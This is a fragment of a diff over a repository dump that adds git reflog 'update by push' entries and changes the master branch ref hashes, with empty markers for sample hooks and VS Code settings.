+a3984938432686ba4df2c95eb65b5cf9e9f31641 5c653ecef0addc79ebdd68415fb7dd1a3fb5d675 justinhalford <justinhalford@gmail.com> 1715383027 -0400	update by push
+5c653ecef0addc79ebdd68415fb7dd1a3fb5d675 933167130761652c11e6af17f43782718933abee justinhalford <justinhalford@gmail.com> 1715383097 -0400	update by push
+933167130761652c11e6af17f43782718933abee 6ccccfa794d72071f763167919ac735c09d65641 justinhalford <justinhalford@gmail.com> 1715383146 -0400	update by push
+6ccccfa794d72071f763167919ac735c09d65641 78370f9cf6b56836b8fc495e7caf4cbccab2e82c justinhalford <justinhalford@gmail.com> 1715383232 -0400	update by push
+78370f9cf6b56836b8fc495e7caf4cbccab2e82c 8634c0fdb323ce207efc409f6fd789e34197424b justinhalford <justinhalford@gmail.com> 1715383251 -0400	update by push
+8634c0fdb323ce207efc409f6fd789e34197424b eaa53e37db0682f2c1aefd185a14cf8d3d80507e justinhalford <justinhalford@gmail.com> 1715383401 -0400	update by push
+eaa53e37db0682f2c1aefd185a14cf8d3d80507e a94c97ce7ff5b186f188cd8f110ad9bdc212b225 justinhalford <justinhalford@gmail.com> 1715383453 -0400	update by push
+a94c97ce7ff5b186f188cd8f110ad9bdc212b225 39d571f431967e0c9352b2d9835be170e9f818cd justinhalford <justinhalford@gmail.com> 1715383461 -0400	update by push
+39d571f431967e0c9352b2d9835be170e9f818cd 524963ab29277056d93616a76b563a6454671341 justinhalford <justinhalford@gmail.com> 1715383563 -0400	update by push
+524963ab29277056d93616a76b563a6454671341 8d02f023905746625979a31d45bfa7929d4d5cdd justinhalford <justinhalford@gmail.com> 1715383573 -0400	update by push
+8d02f023905746625979a31d45bfa7929d4d5cdd 29d73f16f0120790a49bf07703c2d812a1dc9aba justinhalford <justinhalford@gmail.com> 1715383585 -0400	update by push
+29d73f16f0120790a49bf07703c2d812a1dc9aba 98ce28c9d1a8c42ecdf9fb204902987b632333af justinhalford <justinhalford@gmail.com> 1715383596 -0400	update by push
+98ce28c9d1a8c42ecdf9fb204902987b632333af d147a6aee8432d93a3f9aabc2f886fd0977fb78e justinhalford <justinhalford@gmail.com> 1715383673 -0400	update by push
+d147a6aee8432d93a3f9aabc2f886fd0977fb78e 932d69f9da21d524e584c9cb53043b514bcfd7b2 justinhalford <justinhalford@gmail.com> 1715383700 -0400	update by push
+932d69f9da21d524e584c9cb53043b514bcfd7b2 d5af662a610f6a158585390eb3049279c4d3879f justinhalford <justinhalford@gmail.com> 1715383761 -0400	update by push
+d5af662a610f6a158585390eb3049279c4d3879f a367eadd204f119d8419821031ccacb806280906 justinhalford <justinhalford@gmail.com> 1715383788 -0400	update by push
+a367eadd204f119d8419821031ccacb806280906 f62b9a8b8e0c4f83ee5992807acfd28099dce507 justinhalford <justinhalford@gmail.com> 1715383803 -0400	update by push
+f62b9a8b8e0c4f83ee5992807acfd28099dce507 cd97ea4df6752e5d36e4cee392bb4a3e028a6f60 justinhalford <justinhalford@gmail.com> 1715387447 -0400	update by push
+cd97ea4df6752e5d36e4cee392bb4a3e028a6f60 f46b7b672386946268850dec0c1b4c4e3505fdbc justinhalford <justinhalford@gmail.com> 1715387619 -0400	update by push
+f46b7b672386946268850dec0c1b4c4e3505fdbc 07b69abb102fed6e835af43aee45bef7daf4d307 justinhalford <justinhalford@gmail.com> 1715387723 -0400	update by push
+07b69abb102fed6e835af43aee45bef7daf4d307 10320e1ee34661b1b312d9107df873eafdba286e justinhalford <justinhalford@gmail.com> 1715388018 -0400	update by push
 
 <END OF ./.git/logs/refs/remotes/origin/master>
 <START OF ./.git/hooks/commit-msg.sample>
@@ -6619,11 +6842,11 @@ exit 0
 
 <END OF ./.git/hooks/update.sample>
 <START OF ./.git/refs/heads/master>
-d7dafefe27ba333f459e25575ca0bafa491fd46b
+10320e1ee34661b1b312d9107df873eafdba286e
 
 <END OF ./.git/refs/heads/master>
 <START OF ./.git/refs/remotes/origin/master>
-d7dafefe27ba333f459e25575ca0bafa491fd46b
+10320e1ee34661b1b312d9107df873eafdba286e
 
 <END OF ./.git/refs/remotes/origin/master>
 <START OF ./.vscode/settings.json>
